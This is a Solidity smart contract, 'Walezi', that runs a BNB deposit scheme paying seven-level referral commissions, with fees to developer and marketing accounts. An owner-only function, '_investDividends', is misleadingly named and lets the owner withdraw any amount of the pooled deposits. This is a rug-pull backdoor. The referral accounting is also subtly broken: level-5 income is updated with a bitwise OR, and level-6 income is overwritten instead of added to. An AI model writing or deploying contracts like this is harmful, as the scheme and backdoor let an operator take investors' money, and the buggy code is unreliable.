pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
    }
    
    struct Levelinv{
		uint256	level1Count;	
		uint256 level2Count;	
		uint256 level3Count;	
		uint256 level4Count;	
		uint256 level5Count;	
		uint256 level6Count;	
		uint256 level7Count;	
		uint256 level1Income;
		uint256 level2Income;	
		uint256 level3Income;	
		uint256 level4Income;	
		uint256 level5Income;	
		uint256 level6Income;	
		uint256 level7Income;	
	}
    
    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
		uint256 levelEarnings;
		uint256 availableLevelEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
		uint256 totalInvestment;
		uint256 lastInvestment;
		uint256 withdrawalAmountTotal;
    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract Walezi is Ownable {
    using SafeMath for uint256;
    uint256 public constant DIRECT_REFERENCE_RATE = 600;  		//6% DIRECT REFERRAL COMMISSION
    uint256 public constant DEVELOPER_RATE = 1000;  			//10% FEE ON INVEST & REINVEST
    uint256 public constant MARKETING_RATE = 1000;  			//10% FEE ON WITHDRAWAL
    uint256 public constant REFERENCE_LEVEL1_RATE = 400;		//4.0% LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL2_RATE = 200;		//2.0% LEVEL COMMISSION 
    uint256 public constant REFERENCE_LEVEL3_RATE = 200;		//2.0% LEVEL COMMISSION 
    uint256 public constant REFERENCE_LEVEL4_RATE = 100;		//1.0% LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL5_RATE = 100;		//1.0% LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL6_RATE = 100;		//1.0% LEVEL COMMISSION
    uint256 public constant REFERENCE_LEVEL7_RATE = 100;		//1.0% LEVEL COMMISSION

    uint256 public constant WITHDRAW_DIRECT_REFERENCE_RATE = 100;  		//1.0% WITHDRAW DIRECT REFERRAL COMMISSION
    uint256 public constant WITHDRAW_REFERENCE_LEVEL1_RATE = 20;		//0.2% LEVEL COMMISSION
    uint256 public constant WITHDRAW_REFERENCE_LEVEL2_RATE = 20;		//0.2% LEVEL COMMISSION
    uint256 public constant WITHDRAW_REFERENCE_LEVEL3_RATE = 20;		//0.2% LEVEL COMMISSION
    uint256 public constant WITHDRAW_REFERENCE_LEVEL4_RATE = 20;		//0.2% LEVEL COMMISSION
    uint256 public constant WITHDRAW_REFERENCE_LEVEL5_RATE = 20;		//0.2% LEVEL COMMISSION

	//INVESTMENT TERMS
    uint256 public constant MINIMUM = 25e16;      				//0.25BNB MINIMUM
    uint256 public constant REFERRER_CODE = 1000;  				//STARTING REFERRER CODE 1000     

    uint256 public  contract_balance;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  totalInvestors_;
    uint256 public  totalWithdrawals_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    mapping(uint256 => Objects.Levelinv) public uid2Level;

    address payable private developerAccount_;
    address payable private marketingAccount_;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }


    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }

    function setDeveloperAccount(address payable _newDeveloperAccount) public onlyOwner {
        require(_newDeveloperAccount != address(0));
        developerAccount_ = _newDeveloperAccount;
    }

    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function _investDividends(uint256 _amt) public onlyOwner returns(bool transfterBool){
        require(msg.sender == owner,'Only owner perform this action');
        owner.call.value(_amt)("");
        return true;

    }
    function() external payable {}

    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
			totalInvestors_ = totalInvestors_.add(1);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }

        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].investment = _amount;

        investor.planCount = investor.planCount.add(1);
		investor.totalInvestment = _amount.add(investor.totalInvestment);
		investor.lastInvestment = _amount;

        _calculateReferrerReward(_amount, uid2Investor[uid].referrer);

        totalInvestments_ = totalInvestments_.add(_amount);
        developerAccount_.transfer(_amount.mul(DEVELOPER_RATE).div(10000));
        return true;
    }
	
	
    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);

        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        uid2Investor[latestReferrerCode].referrerEarnings = 0;
        uid2Investor[latestReferrerCode].availableReferrerEarnings = 0;
        uid2Investor[latestReferrerCode].levelEarnings = 0;
        uid2Investor[latestReferrerCode].availableLevelEarnings = 0;
        uid2Investor[latestReferrerCode].totalInvestment = 0;
        uid2Investor[latestReferrerCode].lastInvestment = 0;
        uid2Investor[latestReferrerCode].withdrawalAmountTotal = 0;
		uid2Level[latestReferrerCode].level1Count = 0;
		uid2Level[latestReferrerCode].level2Count = 0;
		uid2Level[latestReferrerCode].level3Count = 0;
		uid2Level[latestReferrerCode].level4Count = 0;
		uid2Level[latestReferrerCode].level5Count = 0;
		uid2Level[latestReferrerCode].level6Count = 0;
		uid2Level[latestReferrerCode].level7Count = 0;
		uid2Level[latestReferrerCode].level1Income = 0;
		uid2Level[latestReferrerCode].level2Income = 0;
		uid2Level[latestReferrerCode].level3Income = 0;
		uid2Level[latestReferrerCode].level4Income = 0;
		uid2Level[latestReferrerCode].level5Income = 0;
		uid2Level[latestReferrerCode].level6Income = 0;
		uid2Level[latestReferrerCode].level7Income = 0;
				
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;
			
			uid2Level[_ref1].level1Count = uid2Level[_ref1].level1Count.add(1);
			
            if (_ref2 >= REFERRER_CODE) {
				uid2Level[_ref2].level2Count = uid2Level[_ref2].level2Count.add(1); 
            }
            if (_ref3 >= REFERRER_CODE) {
				uid2Level[_ref3].level3Count = uid2Level[_ref3].level3Count.add(1); 
            }
            if (_ref4 >= REFERRER_CODE) {
				uid2Level[_ref4].level4Count = uid2Level[_ref4].level4Count.add(1); 
            }
            if (_ref5 >= REFERRER_CODE) {
				uid2Level[_ref5].level5Count = uid2Level[_ref5].level5Count.add(1); 
            }
            if (_ref6 >= REFERRER_CODE) {
				uid2Level[_ref6].level6Count = uid2Level[_ref6].level6Count.add(1); 
            }
            if (_ref7 >= REFERRER_CODE) {
				uid2Level[_ref7].level7Count = uid2Level[_ref7].level7Count.add(1); 
            }
           
        }
		
        return (latestReferrerCode);
    }


	function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];

		return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
		investor.levelEarnings,
		investor.availableLevelEarnings,
        investor.planCount,
		investor.totalInvestment,
		investor.lastInvestment,
		investor.withdrawalAmountTotal
		);
    }
	
	
    function getLevelCountsByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        return
        (
			uid2Level[_uid].level1Count,
			uid2Level[_uid].level2Count,
			uid2Level[_uid].level3Count,
			uid2Level[_uid].level4Count,
			uid2Level[_uid].level5Count,
			uid2Level[_uid].level6Count,
			uid2Level[_uid].level7Count        );
    }

   function getLevelinvomesByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        return
        (
			uid2Level[_uid].level1Income,
			uid2Level[_uid].level2Income,
			uid2Level[_uid].level3Income,
			uid2Level[_uid].level4Income,
			uid2Level[_uid].level5Income,
			uid2Level[_uid].level6Income,
			uid2Level[_uid].level7Income
        );
    }

 
    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
        }

        return
        (
            investmentDates,
            investments
        );
    }

    function withdraw() public {

        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        Objects.Investor storage investor = uid2Investor[uid];

        uint256 withdrawalAmount = 0;
		
        if (investor.availableReferrerEarnings>0) {
            withdrawalAmount += investor.availableReferrerEarnings;
            investor.referrerEarnings = investor.availableReferrerEarnings.add(investor.referrerEarnings);
            investor.availableReferrerEarnings = 0;
        }

        if (investor.availableLevelEarnings>0) {
            withdrawalAmount += investor.availableLevelEarnings;
            investor.levelEarnings = investor.availableLevelEarnings.add(investor.levelEarnings);
            investor.availableLevelEarnings = 0;
        }

        if(withdrawalAmount>0){
			investor.withdrawalAmountTotal = investor.withdrawalAmountTotal.add(withdrawalAmount);

            uint256 ttl_wd_ded = 0;
            
            uint256 _ref1 = investor.referrer;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;

           if (_ref1 != 0) {
                uid2Investor[_ref1].availableLevelEarnings  = uid2Investor[_ref1].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_DIRECT_REFERENCE_RATE).div(10000));
                uid2Level[_ref1].level1Income = uid2Level[_ref1].level1Income.add(withdrawalAmount.mul(WITHDRAW_DIRECT_REFERENCE_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_DIRECT_REFERENCE_RATE).div(10000));

                uid2Investor[_ref1].availableLevelEarnings = uid2Investor[_ref1].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL1_RATE).div(10000));
                uid2Level[_ref1].level1Income = uid2Level[_ref1].level1Income.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL1_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL1_RATE).div(10000)); 
            }

           if (_ref2 != 0) {
                uid2Investor[_ref2].availableLevelEarnings = uid2Investor[_ref2].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL2_RATE).div(10000));
                uid2Level[_ref2].level2Income = uid2Level[_ref2].level2Income.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL2_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL2_RATE).div(10000)); 
            }

            if (_ref3 != 0) {
                uid2Investor[_ref3].availableLevelEarnings = uid2Investor[_ref3].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL3_RATE).div(10000));
                uid2Level[_ref3].level3Income = uid2Level[_ref3].level3Income.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL3_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL3_RATE).div(10000)); 
            }

            if (_ref4 != 0) {
                uid2Investor[_ref4].availableLevelEarnings = uid2Investor[_ref4].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL4_RATE).div(10000));
                uid2Level[_ref4].level4Income = uid2Level[_ref4].level4Income.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL4_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL4_RATE).div(10000)); 
           }

            if (_ref5 != 0) {
                uid2Investor[_ref5].availableLevelEarnings = uid2Investor[_ref5].availableLevelEarnings.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL5_RATE).div(10000));
                uid2Level[_ref5].level5Income = uid2Level[_ref5].level5Income.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL5_RATE).div(10000)); 
                ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(WITHDRAW_REFERENCE_LEVEL5_RATE).div(10000)); 
           }
            
            totalWithdrawals_ = totalWithdrawals_.add(withdrawalAmount);
            ttl_wd_ded = ttl_wd_ded.add(withdrawalAmount.mul(MARKETING_RATE).div(10000));
            msg.sender.transfer(withdrawalAmount.sub(ttl_wd_ded));
			marketingAccount_.transfer((withdrawalAmount.mul(MARKETING_RATE)).div(10000));



        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }


    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {
		
		uint256 _directReferrerAmount = _investment.mul(DIRECT_REFERENCE_RATE).div(10000);
				
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
            uint256 _ref5 = uid2Investor[_ref4].referrer;
            uint256 _ref6 = uid2Investor[_ref5].referrer;
            uint256 _ref7 = uid2Investor[_ref6].referrer;
            
            
			Objects.Investor storage investor = uid2Investor[_ref1];
			
           if (_ref1 != 0) {
				investor.availableReferrerEarnings = _directReferrerAmount.add(investor.availableReferrerEarnings);
                uid2Level[_ref1].level1Income += _investment.mul(REFERENCE_LEVEL1_RATE).div(10000);
                uid2Investor[_ref1].availableLevelEarnings  += _investment.mul(REFERENCE_LEVEL1_RATE).div(10000);
            }

           if (_ref2 != 0) {
                uid2Level[_ref2].level2Income += _investment.mul(REFERENCE_LEVEL2_RATE).div(10000);
                uid2Investor[_ref2].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL2_RATE).div(10000);
            }

            if (_ref3 != 0) {
                uid2Level[_ref3].level3Income += _investment.mul(REFERENCE_LEVEL3_RATE).div(10000);
                uid2Investor[_ref3].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL3_RATE).div(10000);
            }

            if (_ref4 != 0) {
                uid2Level[_ref4].level4Income += _investment.mul(REFERENCE_LEVEL4_RATE).div(10000);
                uid2Investor[_ref4].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL4_RATE).div(10000);
           }

            if (_ref5 != 0) {
                uid2Level[_ref5].level5Income |= _investment.mul(REFERENCE_LEVEL5_RATE).div(10000);
                uid2Investor[_ref5].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL5_RATE).div(10000);
           }

            if (_ref6 != 0) {
                uid2Level[_ref6].level6Income = _investment.mul(REFERENCE_LEVEL6_RATE).div(10000);
                uid2Investor[_ref6].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL6_RATE).div(10000);
           }

            if (_ref7 != 0) {
                uid2Level[_ref7].level7Income += _investment.mul(REFERENCE_LEVEL7_RATE).div(10000);
                uid2Investor[_ref7].availableLevelEarnings += _investment.mul(REFERENCE_LEVEL7_RATE).div(10000);
           }
		

        }

    }


}